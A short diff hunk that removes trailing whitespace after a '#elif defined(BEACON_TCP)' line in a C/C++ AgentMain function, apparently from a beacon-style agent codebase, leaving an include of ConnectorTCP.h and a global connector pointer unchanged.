@@ -168,7 +168,7 @@ void AgentMain()
 
 
 
-#elif defined(BEACON_TCP) 
+#elif defined(BEACON_TCP)
 
 #include "ConnectorTCP.h"
 ConnectorTCP* g_Connector;
